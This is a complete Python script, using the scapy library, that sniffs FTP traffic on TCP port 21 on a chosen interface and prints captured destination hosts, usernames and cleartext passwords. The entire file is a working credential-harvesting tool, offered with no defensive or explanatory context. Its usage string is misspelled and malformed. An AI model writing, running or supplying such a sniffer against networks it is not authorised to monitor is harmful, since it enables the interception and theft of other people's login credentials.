#!/usr/bin/python

import optparse
from scapy.all import *

def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP login to: ' + str(dest))
        # Select first element from User
        print('[+] User account: ' + str(user[0]).strip('\r').strip('\n'))
    elif pswd:
        # Select first element from password
        print('[+] Password: ' + str(pswd[0]).strip('\r').strip('\n'))

def main():
    parser = optparse.OptionParser('Useage:' +\
        'i<interface>')
    parser.add_option('-i', dest='interface', \
        type='string', help='Specify interface to listen on.')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)

main()